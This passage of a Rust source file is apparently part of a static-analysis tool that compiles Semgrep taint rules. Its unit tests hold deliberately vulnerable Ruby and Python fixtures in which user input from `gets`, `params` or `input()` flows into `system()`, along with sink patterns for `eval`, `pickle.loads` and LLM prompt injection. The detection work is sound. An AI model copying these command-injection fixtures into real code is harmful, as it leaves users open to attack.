/// part of `==`, `!=`, `<=`, or `>=`.  Returns the position of the `=`
/// character, or `None` if no such operator is present.
fn find_single_assignment(s: &str) -> Option<usize> {
    let bytes = s.as_bytes();
    for (i, &b) in bytes.iter().enumerate() {
        if b != b'=' {
            continue;
        }
        // Reject `==`.
        if bytes.get(i + 1) == Some(&b'=') {
            continue;
        }
        // Reject `!=`, `<=`, `>=`.
        if i > 0 && matches!(bytes[i - 1], b'!' | b'<' | b'>') {
            continue;
        }
        return Some(i);
    }
    None
}

/// If `pat` is a subscript / index access `base[...]`, return the matched
/// base as `Some(Some(name))` (concrete base whose final segment is `name`)
/// or `Some(None)` (metavariable base — match any subscript). Returns `None`
/// when `pat` is not a subscript shape we can express.
///
/// The base is the substring before the FIRST `[`; the pattern must end with
/// `]`. The base must be one of:
/// - a plain identifier (`params` → `Some(Some("params"))`)
/// - a dotted attribute chain (`request.POST` → `Some(Some("POST"))`,
///   `flask.request.args` → `Some(Some("args"))` — final segment)
/// - a bare metavariable (`$VALS` → `Some(None)`)
/// - a chain whose final segment is a metavariable (`$REQ.$X` → `Some(None)`)
///
/// Anything else (empty base, base containing a call, nested brackets that
/// don't close at the end, operators) returns `None`.
fn parse_subscript_base(pat: &str) -> Option<Option<String>> {
    if !pat.ends_with(']') {
        return None;
    }
    let open = pat.find('[')?;
    let base = pat[..open].trim();
    if base.is_empty() {
        return None;
    }
    // The base must not be a call or contain other brackets / operators.
    if base.contains('(') || base.contains(')') || base.contains('[') || base.contains(' ') {
        return None;
    }
    // Bare metavariable base → match any subscript.
    if is_metavariable(base) {
        return Some(None);
    }
    // Plain identifier base.
    if is_identifier(base) {
        return Some(Some(base.to_string()));
    }
    // Dotted chain: take the final segment. If it is a metavariable, the
    // indexed property is unknown → match any subscript. Otherwise use the
    // final identifier segment as the base name.
    if let Some(dot) = base.rfind('.') {
        let last = &base[dot + 1..];
        if is_metavariable(last) {
            return Some(None);
        }
        if is_identifier(last) {
            // Require every preceding segment to be an identifier or a
            // metavariable so we only accept genuine attribute chains.
            let head_ok = base[..dot]
                .split('.')
                .all(|seg| is_identifier(seg) || is_metavariable(seg));
            if head_ok {
                return Some(Some(last.to_string()));
            }
        }
    }
    None
}

/// True when `pat` is an object/dict literal sink shape: a brace-delimited
/// literal `{ ... }` that contains at least one `key: $METAVAR` value position.
///
/// Recognises the LLM system-prompt-injection sinks
/// `{role: "system", content: $SINK}` (JS) and
/// `{"role": "system", "content": $SINK}` (Python). The compile-time check
/// only recognises the *shape* (a literal-construction sink whose value slot is
/// a metavariable); the engine enforces the "literal is actually constructed
/// AND a tainted value reaches a value slot" guard at match time.
///
/// Discipline: must start with `{` and end with `}` (a real literal, not a set
/// comprehension or a block) and must contain a `:` immediately followed
/// (ignoring whitespace) by a `$` metavariable somewhere — i.e. a tainted value
/// position. This refuses bare `{$X}` set/dict-key shapes and `{...}` ellipsis
/// blobs that carry no metavariable value.
fn is_object_literal_value_pattern(pat: &str) -> bool {
    let p = pat.trim();
    if !(p.starts_with('{') && p.ends_with('}')) {
        return false;
    }
    // Need at least one `:` whose value side begins with a `$` metavariable.
    let bytes = p.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b':' {
            // Skip whitespace after the colon.
            let mut j = i + 1;
            while j < bytes.len() && (bytes[j] as char).is_whitespace() {
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'$' {
                // The metavariable must be a real `$NAME`, not `${` (a JS
                // template-substitution would not appear at a value head here,
                // but guard anyway) and not the end of the literal.
                let mut k = j + 1;
                if k < bytes.len() && (bytes[k].is_ascii_alphabetic() || bytes[k] == b'_') {
                    while k < bytes.len() && (bytes[k].is_ascii_alphanumeric() || bytes[k] == b'_')
                    {
                        k += 1;
                    }
                    return true;
                }
            }
        }
        i += 1;
    }
    false
}

/// True (as `Some(())`) when `pat` is exactly `return $METAVAR` — the keyword
/// `return`, whitespace, then a single bare Semgrep metavariable and nothing
/// else. This is the LLM "unsanitized return" / directly-returned sink shape.
/// Refuses `return "...".format(...)`, `return $X + $Y`, `return f"..."`, etc.
/// (those are handled — or not — by other shapes), and refuses a bare `return`.
fn parse_return_metavar(pat: &str) -> Option<()> {
    let rest = pat.strip_prefix("return")?;
    // Require whitespace right after `return` (so `returnx` is not matched).
    if !rest.starts_with(char::is_whitespace) {
        return None;
    }
    let v = rest.trim();
    // Must be a single bare metavariable `$NAME` (uppercase Semgrep convention,
    // but accept any valid identifier after `$`) with no trailing tokens.
    let name = v.strip_prefix('$')?;
    if name.is_empty() {
        return None;
    }
    let mut chars = name.chars();
    let first = chars.next()?;
    if !(first.is_ascii_alphabetic() || first == '_') {
        return None;
    }
    if name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        Some(())
    } else {
        None
    }
}

/// True when `pat` is a string-building sink shape the engine should match as
/// a `BinopFormat`: a binary `+`/`%` concatenation or an f-string
/// interpolation. The compile-time check only recognises the *shape*; the
/// engine enforces the literal-operand + tainted-operand guard at match time.
///
/// Recognised:
/// - f-string interpolation: `f"...{$X}..."` / `f'...{$X}...'`
/// - binary `+`/`%`: `"$SQL" + $EXPR`, `$A + $B`, `$M % $M`, `... + $X`
///   — split on top-level ` + ` / ` % ` operators (outside quotes/brackets);
///   every operand must be a quoted string literal, a metavariable, the
///   `...` ellipsis, or a plain/dotted identifier chain, and at least two
///   operands must be present.
///
/// Rejected (returns false): plain calls, attribute chains, subscripts,
/// assignments, and any binop whose operands include unrecognised tokens.
fn is_binop_format_pattern(pat: &str) -> bool {
    // f-string interpolation: `f"...{$...}..."`.
    if (pat.starts_with("f\"") || pat.starts_with("f'")) && pat.contains("{$") {
        return true;
    }

    // Binary `+` / `%` concatenation. Split on top-level operators, skipping
    // anything inside quotes or brackets so `"a + b"` and `f($x + $y)` don't
    // confuse the scan.
    let operands = split_top_level_binop(pat);
    let Some(operands) = operands else {
        return false;
    };
    if operands.len() < 2 {
        return false;
    }
    operands.iter().all(|o| is_binop_operand(o))
}

/// Split `pat` on top-level ` + ` / ` % ` operators, returning the operand
/// substrings, or `None` if there is no such top-level operator (so the caller
/// can reject the shape). "Top-level" means not inside `"`/`'` quotes or
/// `(`/`[`/`{` brackets.
fn split_top_level_binop(pat: &str) -> Option<Vec<&str>> {
    let bytes = pat.as_bytes();
    let mut operands = Vec::new();
    let mut start = 0usize;
    let mut depth: i32 = 0;
    let mut quote: Option<u8> = None;
    let mut found_op = false;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match b {
            b'"' | b'\'' => quote = Some(b),
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth -= 1,
            b'+' | b'%' if depth == 0 => {
                // Require surrounding spaces to be a binary operator (Semgrep
                // formatting always uses `a + b`, never `a+b` in these rules).
                let space_before = i > 0 && bytes[i - 1] == b' ';
                let space_after = i + 1 < bytes.len() && bytes[i + 1] == b' ';
                if space_before && space_after {
                    operands.push(pat[start..i].trim());
                    start = i + 1;
                    found_op = true;
                }
            }
            _ => {}
        }
        i += 1;
    }
    if !found_op {
        return None;
    }
    operands.push(pat[start..].trim());
    Some(operands)
}

/// True when `o` is an acceptable operand of a `BinopFormat` concatenation: a
/// quoted string literal, a Semgrep metavariable (`$X`), the `...` ellipsis, a
/// plain/dotted identifier chain, or such a chain wrapped in a single call /
/// subscript. Anything containing further unbalanced operators is rejected.
fn is_binop_operand(o: &str) -> bool {
    let o = o.trim();
    if o.is_empty() {
        return false;
    }
    if o == "..." {
        return true;
    }
    // Quoted string literal (possibly an f-string).
    if (o.starts_with('"') && o.ends_with('"') && o.len() >= 2)
        || (o.starts_with('\'') && o.ends_with('\'') && o.len() >= 2)
        || (o.starts_with("f\"") && o.ends_with('"'))
        || (o.starts_with("f'") && o.ends_with('\''))
    {
        return true;
    }
    if is_metavariable(o) {
        return true;
    }
    if is_dotted_identifier(o) {
        return true;
    }
    false
}

/// If `callee` has the shape `$METAVAR.plain_method` — exactly one
/// `$`-prefixed metavariable segment followed by a plain identifier — return
/// the method name. Returns `None` for all other shapes.
///
/// Examples:
/// - `$CONN.executeQuery` → `Some("executeQuery")`
/// - `$OBJ.innerHTML` → `Some("innerHTML")`
/// - `pickle.loads` → `None` (dotted plain identifier, handled as `Call`)
/// - `$X` → `None` (bare metavariable, no method)
/// - `$A.b.c` → `None` (more than one segment after the metavar)
fn parse_metavar_dot_method(callee: &str) -> Option<&str> {
    let dot = callee.find('.')?;
    let receiver = &callee[..dot];
    let rest = &callee[dot + 1..];
    // Receiver must be a metavariable: `$` followed by UPPER or `_`
    if !is_metavariable(receiver) {
        return None;
    }
    // The rest must be a single plain identifier (no more dots).
    if rest.contains('.') {
        return None;
    }
    if !is_identifier(rest) {
        return None;
    }
    Some(rest)
}

/// If `pat` has the shape `root.$METAVAR` — a *concrete* plain-identifier root
/// followed by a single metavariable field — return the root identifier.
/// Used to compile `request.$ANYTHING` (Django/Flask "any request attribute")
/// to a `ParamName` source on the concrete root. Returns `None` for a
/// metavariable root (`$REQ.$ANYTHING` — too broad), a concrete field
/// (`request.GET` — that is a plain `Attribute`), or any chain that is not
/// exactly two dot-separated segments.
///
/// Examples:
/// - `request.$ANYTHING` → `Some("request")`
/// - `req.$X`            → `Some("req")`
/// - `$REQ.$ANYTHING`    → `None` (metavar root)
/// - `request.GET`       → `None` (concrete field — handled by `Attribute`)
/// - `a.b.$X`            → `None` (more than two segments)
fn parse_concrete_root_metavar_field(pat: &str) -> Option<&str> {
    let dot = pat.find('.')?;
    let root = &pat[..dot];
    let field = &pat[dot + 1..];
    // Exactly two segments: the field must not contain a further dot.
    if field.contains('.') {
        return None;
    }
    if !is_identifier(root) {
        return None;
    }
    if !is_metavariable(field) {
        return None;
    }
    Some(root)
}

/// If `callee` is a CALL-ON-MEMBER receiver chain — a dotted path of three or
/// more segments where (a) at least one segment is a Semgrep metavariable
/// (otherwise the fully-concrete chain is already handled by the `Call`
/// branch), (b) the *final* segment (the method name) is a concrete
/// identifier, and (c) the *penultimate* segment (the field read just before
/// the method) is a concrete identifier — return the penultimate field name.
///
/// Every other segment may be an identifier or a metavariable. Returns `None`
/// for two-segment callees (handled by [`parse_metavar_dot_method`] /
/// [`parse_receiver_dot_metavar`]), for chains whose penultimate or final
/// segment is a metavariable (we refuse to compile an any-field/any-method
/// matcher — too broad), and for fully-concrete chains.
///
/// Examples:
/// - `$CLIENT.chat.completions.create` → `Some("completions")`
/// - `$CLIENT.messages.create`         → `Some("messages")`
/// - `$REQ.POST.get`                   → `Some("POST")`
/// - `request.$PROPERTY.get`           → `None` (penultimate is a metavar)
/// - `$CONN.executeQuery`              → `None` (two segments)
/// - `flask.request.form.get`          → `None` (fully concrete → `Call`)
fn parse_member_call_penultimate(callee: &str) -> Option<&str> {
    let segments: Vec<&str> = callee.split('.').collect();
    if segments.len() < 3 {
        return None;
    }
    let method = segments[segments.len() - 1];
    let field = segments[segments.len() - 2];
    // Final method and penultimate field must both be concrete identifiers.
    if !is_identifier(method) || !is_identifier(field) {
        return None;
    }
    // Every other (prefix) segment must be an identifier or a metavariable.
    let mut has_metavar = false;
    for seg in &segments[..segments.len() - 2] {
        if is_metavariable(seg) {
            has_metavar = true;
        } else if !is_identifier(seg) {
            return None;
        }
    }
    // A fully-concrete chain is already compiled by the `Call` branch; only
    // engage when a metavariable is present in the receiver prefix.
    if !has_metavar {
        return None;
    }
    Some(field)
}

/// If `callee` has the shape `receiver.$METAVAR` — a concrete plain
/// identifier receiver followed by a single metavariable method segment —
/// return the receiver name. The symmetric counterpart of
/// [`parse_metavar_dot_method`]. Returns `None` for all other shapes.
///
/// Examples:
/// - `os.$METHOD` → `Some("os")`
/// - `subprocess.$FUNC` → `Some("subprocess")`
/// - `Kernel.$X` → `Some("Kernel")`
/// - `$CONN.executeQuery` → `None` (metavar receiver — handled as MethodName)
/// - `os.system` → `None` (concrete method — handled as Call)
/// - `a.b.$X` → `None` (multi-segment receiver, ambiguous)
fn parse_receiver_dot_metavar(callee: &str) -> Option<&str> {
    let dot = callee.find('.')?;
    let receiver = &callee[..dot];
    let rest = &callee[dot + 1..];
    // Receiver must be a single plain identifier (no further dots).
    if !is_identifier(receiver) {
        return None;
    }
    // The method segment must be a single metavariable (no more dots).
    if rest.contains('.') {
        return None;
    }
    if !is_metavariable(rest) {
        return None;
    }
    Some(receiver)
}

/// True when `s` is a Semgrep metavariable: `$` followed by one or more
/// ASCII uppercase letters or underscores (e.g. `$X`, `$CONN`, `$_`).
fn is_metavariable(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some('$') => {}
        _ => return false,
    }
    let rest: String = chars.collect();
    // Semgrep metavariables are `$` + `[A-Z_][A-Z0-9_]*` — allow trailing digits
    // (e.g. `$ARG1`) while still rejecting lowercase (`$obj`).
    !rest.is_empty()
        && rest
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
}

fn describe(canonical: &str, role: MatcherRole) -> String {
    match role {
        MatcherRole::Source => format!("semgrep source `{}`", canonical),
        MatcherRole::Sink => format!("semgrep sink `{}`", canonical),
        MatcherRole::Sanitizer => format!("semgrep sanitizer `{}`", canonical),
    }
}

/// True when `s` is a `.`-separated chain of identifier segments, each of
/// which is an ASCII identifier (`[A-Za-z_][A-Za-z0-9_]*`). Used to reject
/// pattern strings that contain metavariables, operators, or whitespace
/// outside of a call form.
fn is_dotted_identifier(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    s.split('.').all(is_identifier)
}

fn is_identifier(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// True when `s` is a PHP variable: `$` followed by a valid identifier.
///
/// Examples: `$_GET`, `$_POST`, `$request`, `$cmd`.
///
/// This is a SOURCE-only shape — there is no meaningful PHP sink that is
/// just a bare variable name.
fn is_php_variable(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some('$') => {}
        _ => return false,
    }
    // After `$`, the rest must be a valid PHP identifier: [A-Za-z_][A-Za-z0-9_]*
    let rest: &str = &s[1..];
    if rest.is_empty() {
        return false;
    }
    is_identifier(rest)
}

fn map_severity(s: &str) -> Severity {
    match s.to_ascii_uppercase().as_str() {
        "ERROR" => Severity::Critical,
        "WARNING" => Severity::High,
        "INFO" => Severity::Medium,
        _ => Severity::Medium,
    }
}

fn extract_cwe(yaml: &YamlValue) -> Option<String> {
    let meta = yaml.get("metadata")?;
    let cwe = meta.get("cwe")?;
    match cwe {
        YamlValue::String(s) => Some(s.clone()),
        YamlValue::Sequence(v) => v.first().and_then(|x| x.as_str()).map(|s| s.to_string()),
        _ => None,
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn compile(pattern: &str, role: MatcherRole) -> Option<GenericMatcher> {
        compile_pattern(pattern, role, Language::Python)
    }

    #[test]
    fn compile_attribute_source() {
        let m = compile("request.data", MatcherRole::Source).expect("attribute");
        match m {
            GenericMatcher::Attribute { root, field, .. } => {
                assert_eq!(root, "request");
                assert_eq!(field, "data");
            }
            _ => panic!("expected Attribute"),
        }
    }

    #[test]
    fn compile_nested_attribute_takes_leftmost_root_and_outermost_field() {
        let m = compile("request.session.user_id", MatcherRole::Source).expect("attribute");
        match m {
            GenericMatcher::Attribute { root, field, .. } => {
                assert_eq!(root, "request");
                assert_eq!(field, "user_id");
            }
            _ => panic!("expected Attribute"),
        }
    }

    #[test]
    fn compile_call_with_metavar() {
        let m = compile("pickle.loads($X)", MatcherRole::Sink).expect("call");
        match m {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "pickle.loads"),
            _ => panic!("expected Call"),
        }
    }

    #[test]
    fn compile_call_with_ellipsis() {
        let m = compile("pickle.loads(...)", MatcherRole::Sink).expect("call");
        match m {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "pickle.loads"),
            _ => panic!("expected Call"),
        }
    }

    #[test]
    fn compile_bare_func_call() {
        let m = compile("eval($X)", MatcherRole::Sink).expect("call");
        match m {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "eval"),
            _ => panic!("expected Call"),
        }
    }

    // ── CALL-ON-MEMBER shape unit tests ─────────────────────────────────────

    #[test]
    fn compile_member_call_metavar_root_yields_fieldname_on_penultimate() {
        // `$CLIENT.chat.completions.create(...)` → FieldName { field: "completions" }
        let m = compile("$CLIENT.chat.completions.create(...)", MatcherRole::Source)
            .expect("member-call source");
        match m {
            GenericMatcher::FieldName { field, .. } => assert_eq!(field, "completions"),
            other => panic!("expected FieldName, got {other:?}"),
        }
        let m = compile("$CLIENT.messages.create(...)", MatcherRole::Source).expect("member-call");
        match m {
            GenericMatcher::FieldName { field, .. } => assert_eq!(field, "messages"),
            other => panic!("expected FieldName, got {other:?}"),
        }
    }

    #[test]
    fn compile_member_call_metavar_root_concrete_field_as_sink() {
        // `$CLIENT.calls.create(...)` (twiml sink) → FieldName { field: "calls" }.
        let m = compile("$CLIENT.calls.create(...)", MatcherRole::Sink).expect("member-call sink");
        match m {
            GenericMatcher::FieldName { field, .. } => assert_eq!(field, "calls"),
            other => panic!("expected FieldName, got {other:?}"),
        }
    }

    #[test]
    fn compile_member_call_metavar_penultimate_is_rejected() {
        // `request.$PROPERTY.get(...)` has a metavar penultimate → we refuse to
        // compile an any-field `.get(...)` matcher (too broad). It must NOT
        // become a FieldName.
        let m = compile("request.$PROPERTY.get(...)", MatcherRole::Source);
        assert!(
            !matches!(m, Some(GenericMatcher::FieldName { .. })),
            "metavar penultimate must not compile to FieldName, got {m:?}"
        );
    }

    #[test]
    fn compile_member_call_fully_concrete_stays_call() {
        // A fully-concrete chain must keep using `Call`, not the member-call path.
        let m = compile("flask.request.form.get(...)", MatcherRole::Source).expect("concrete call");
        match m {
            GenericMatcher::Call { canonical, .. } => {
                assert_eq!(canonical, "flask.request.form.get")
            }
            other => panic!("expected Call, got {other:?}"),
        }
    }

    #[test]
    fn parse_member_call_penultimate_edge_cases() {
        assert_eq!(
            parse_member_call_penultimate("$CLIENT.chat.completions.create"),
            Some("completions")
        );
        assert_eq!(parse_member_call_penultimate("$REQ.POST.get"), Some("POST"));
        // two-segment → handled elsewhere.
        assert_eq!(parse_member_call_penultimate("$CONN.executeQuery"), None);
        // metavar method → reject.
        assert_eq!(parse_member_call_penultimate("$REQ.POST.$M"), None);
        // metavar penultimate → reject.
        assert_eq!(parse_member_call_penultimate("request.$PROP.get"), None);
        // fully concrete → reject (Call handles it).
        assert_eq!(parse_member_call_penultimate("a.b.c"), None);
    }

    #[test]
    fn compile_bare_identifier_source() {
        let m = compile("request", MatcherRole::Source).expect("paramname");
        match m {
            GenericMatcher::ParamName { names, .. } => {
                assert_eq!(names, vec!["request".to_string()])
            }
            _ => panic!("expected ParamName"),
        }
    }

    #[test]
    fn bare_identifier_rejected_as_sink() {
        assert!(compile("request", MatcherRole::Sink).is_none());
    }

    #[test]
    fn weird_shapes_rejected() {
        assert!(compile("$X + $Y", MatcherRole::Source).is_none());
        assert!(compile("a.b.c(d", MatcherRole::Sink).is_none());
        assert!(compile("", MatcherRole::Source).is_none());
    }

    #[test]
    fn parse_full_taint_rule() {
        let yaml = r#"
id: semgrep-pickle-taint
mode: taint
languages: [python]
severity: ERROR
message: "Untrusted input reaches pickle.loads"
metadata:
  cwe: "CWE-502"
pattern-sources:
  - pattern: request.data
  - pattern: request
pattern-sinks:
  - pattern: pickle.loads($X)
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.id, "semgrep/semgrep-pickle-taint");
                assert_eq!(r.lang, Language::Python);
                assert_eq!(r.cwe.as_deref(), Some("CWE-502"));
                assert_eq!(r.spec.sources.len(), 2);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn non_taint_rule_falls_through() {
        let yaml = r#"
id: classic
pattern: eval(...)
message: x
severity: ERROR
languages: [python]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        assert!(matches!(parse_taint_rule(&v), TaintRuleParse::NotTaint));
    }

    #[test]
    fn taint_rule_with_unsupported_language_is_skipped() {
        let yaml = r#"
id: x
mode: taint
languages: [elixir]
severity: ERROR
message: m
pattern-sources: [{pattern: req}]
pattern-sinks: [{pattern: eval($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        assert!(matches!(parse_taint_rule(&v), TaintRuleParse::Skip(_)));
    }

    #[test]
    fn taint_rule_with_ruby_language_compiles() {
        let yaml = r#"
id: ruby-taint
mode: taint
languages: [ruby]
severity: ERROR
message: m
pattern-sources: [{pattern: gets($X)}]
pattern-sinks: [{pattern: system($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Ruby);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_rb_alias_compiles_as_ruby() {
        let yaml = r#"
id: rb-taint
mode: taint
languages: [rb]
severity: ERROR
message: m
pattern-sources: [{pattern: gets($X)}]
pattern-sinks: [{pattern: eval($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => assert_eq!(r.lang, Language::Ruby),
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn ruby_taint_rule_produces_finding_for_source_to_sink_flow() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-cmd-injection
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted input reaches system"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: gets($X)
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def run
  cmd = gets
  system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for gets -> system flow, got none"
        );
        assert!(
            findings[0].description.contains("gets"),
            "description should mention source"
        );
    }

    // ── `pattern-not` enforcement in taint `patterns:` AND-blocks ────────────
    //
    // Previously a `pattern-not:` inside a `pattern-sinks` `patterns:` block was
    // DROPPED, broadening the compiled matcher and over-reporting. These two
    // tests pin the fix: the SAME source→sink fixture fires on both sinks when
    // there is no `pattern-not`, and the allow-listed sink is suppressed when a
    // `pattern-not` names it. Both rules compile through the real
    // `parse_taint_rule` path the CLI uses.

    const PATTERN_NOT_SRC: &str = r#"
def handler():
    cmd = input()
    dangerous(cmd)
    allowlisted(cmd)
"#;

    #[test]
    fn taint_patterns_block_without_pattern_not_reports_both_sinks() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-no-negative
mode: taint
languages: [python]
severity: ERROR
message: "tainted input reaches a sink"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: input($X)
pattern-sinks:
  - pattern: dangerous($X)
  - pattern: allowlisted($X)
"#,
        );
        let tree = parse_file(PATTERN_NOT_SRC, Language::Python).expect("fixture parses");
        let findings = rule.check(PATTERN_NOT_SRC, &tree);
        assert_eq!(
            findings.len(),
            2,
            "both dangerous() and allowlisted() sinks should fire without pattern-not, got {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
    }

    #[test]
    fn taint_patterns_block_pattern_not_suppresses_allowlisted_sink() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-with-negative
mode: taint
languages: [python]
severity: ERROR
message: "tainted input reaches a sink"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: input($X)
pattern-sinks:
  - pattern: dangerous($X)
  - patterns:
      - pattern: allowlisted($X)
      - pattern-not: allowlisted($X)
"#,
        );
        let tree = parse_file(PATTERN_NOT_SRC, Language::Python).expect("fixture parses");
        let findings = rule.check(PATTERN_NOT_SRC, &tree);
        assert_eq!(
            findings.len(),
            1,
            "pattern-not should suppress the allowlisted() sink, leaving only dangerous(); got {:?}",
            findings
                .iter()
                .map(|f| f.sink_description.clone())
                .collect::<Vec<_>>()
        );
        assert!(
            findings[0]
                .sink_description
                .as_deref()
                .map(|d| d.contains("dangerous"))
                .unwrap_or(false),
            "the surviving finding should be the dangerous() sink, got {:?}",
            findings[0].sink_description
        );
    }

    // ── `pattern-inside` enforcement in taint `patterns:` AND-blocks ─────────
    //
    // Previously a `pattern-inside:` inside a `pattern-sinks` `patterns:` block
    // was DROPPED, so the sink matched EVERYWHERE instead of only inside the
    // required region — the rule fired far too broadly. These tests pin the
    // fix: with an identical tainted flow present in TWO functions, the rule
    // fires on BOTH sinks when there is no `pattern-inside`, and only on the
    // sink inside the named region when a `pattern-inside` restricts it. Both
    // rules compile through the real `parse_taint_rule` path the CLI uses.
    //
    // `pattern-inside` is the INVERSE of `pattern-not` (which suppresses a
    // finding whose sink is INSIDE the region): `pattern-inside` keeps a
    // finding only when its sink IS inside the region.

    const PATTERN_INSIDE_SRC: &str = r#"
def safe_zone():
    cmd = input()
    dangerous(cmd)

def other_zone():
    cmd = input()
    dangerous(cmd)
"#;

    #[test]
    fn taint_patterns_block_without_pattern_inside_reports_both_regions() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-no-inside
mode: taint
languages: [python]
severity: ERROR
message: "tainted input reaches a sink"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: input($X)
pattern-sinks:
  - pattern: dangerous($X)
"#,
        );
        let tree = parse_file(PATTERN_INSIDE_SRC, Language::Python).expect("fixture parses");
        let findings = rule.check(PATTERN_INSIDE_SRC, &tree);
        assert_eq!(
            findings.len(),
            2,
            "without pattern-inside, dangerous() should fire in BOTH functions, got lines {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
    }

    #[test]
    fn taint_patterns_block_pattern_inside_restricts_to_region() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-with-inside
mode: taint
languages: [python]
severity: ERROR
message: "tainted input reaches a sink"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: input($X)
pattern-sinks:
  - patterns:
      - pattern: dangerous($X)
      - pattern-inside: |
          def safe_zone():
              ...
"#,
        );
        let tree = parse_file(PATTERN_INSIDE_SRC, Language::Python).expect("fixture parses");
        let findings = rule.check(PATTERN_INSIDE_SRC, &tree);
        assert_eq!(
            findings.len(),
            1,
            "pattern-inside should keep ONLY the sink inside safe_zone(), got lines {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
        // The surviving finding must be the `dangerous(cmd)` on line 4 (inside
        // safe_zone), NOT the identical one on line 8 (inside other_zone).
        assert_eq!(
            findings[0].line, 4,
            "the surviving finding should be inside safe_zone() (line 4), got line {}",
            findings[0].line
        );
    }

    // ── Bridge-level (end-to-end) tests for BARE-IDENTIFIER Ruby sources ─────
    //
    // These compile a rule through `parse_taint_rule` (the SAME path the CLI
    // uses) where the source is a bare identifier (`params`, `gets`) with no
    // parens. The bridge compiles those to `GenericMatcher::ParamName`, which
    // is the path that was previously broken end-to-end (the `analyze_tree`
    // unit tests bypassed it by hand-building `Call` specs). We assert the
    // sink line and that a sanitized variant produces no finding.

    /// `params[:cmd] → system(cmd)` via the bare-identifier `params` source.
    #[test]
    fn ruby_bridge_bare_params_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-params-cmdi
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted params reaches system"
pattern-sources:
  - pattern: params
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def handler
  cmd = params[:cmd]
  system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for params[:cmd] -> system, got {:?}",
            findings
        );
        // sink is on the `system(cmd)` line (line 4 with leading newline).
        assert_eq!(
            findings[0].line, 4,
            "finding should be at the system() sink line"
        );
    }

    /// Bare `gets` (no parens) → `system(cmd)` via the `ParamName` bridge path.
    #[test]
    fn ruby_bridge_bare_gets_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-gets-cmdi
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted gets reaches system"
pattern-sources:
  - pattern: gets
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def handler
  cmd = gets
  system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for bare gets -> system, got {:?}",
            findings
        );
        assert_eq!(
            findings[0].line, 4,
            "finding should be at the system() sink line"
        );
    }

    /// A sanitizer between a bare-identifier source and the sink blocks the
    /// flow end-to-end (still through the bridge).
    #[test]
    fn ruby_bridge_bare_params_source_sanitized_produces_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
